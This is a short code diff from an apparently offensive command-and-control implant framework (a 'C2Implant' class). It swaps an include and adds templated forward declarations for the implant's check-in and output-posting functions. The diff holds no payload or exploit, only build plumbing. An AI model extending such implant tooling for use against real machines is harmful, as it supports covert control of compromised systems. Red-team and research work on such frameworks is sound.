@@ -11,7 +11,7 @@ Required Keys:
 #include "c2.h"
 #include "../protocols/json/json.h"
 #include "../data/msgpack/msgpack.h"
-#include "../lifecycle/comms.h" //comms has all the funcs for comms
+//#include "../lifecycle/comms.cpp" //comms has all the funcs for comms, intentional import of .cpp, instead of .h for inline funcs/template build ease
 #include "settings.h"
 
 // ======================================================================================
@@ -19,6 +19,21 @@ Required Keys:
 // ======================================================================================
 std::map<std::string, IngressFunc> C2Implant::s_ingress_map;
 std::map<std::string, EgressFunc> C2Implant::s_egress_map;
+
+// --- GENERATED FORWARD DECLARATIONS ---
+// This tells c2.cpp that these functions exist in another file (comms.cpp)
+
+[%- for c2_get_profile in get_function_mappings.values() %]
+
+nlohmann::json [[ c2_get_profile.value ]](std::string implant_uuid);
+
+[%- endfor %]
+
+[%- for c2_post_profile in post_function_mappings.values() %]
+
+int [[ c2_post_profile.value ]](std::string implant_uuid, std::string output_data, std::string task_uuid);
+
+[%- endfor %]
 
 // ======================================================================================
 // 3. CLASS IMPLEMENTATION
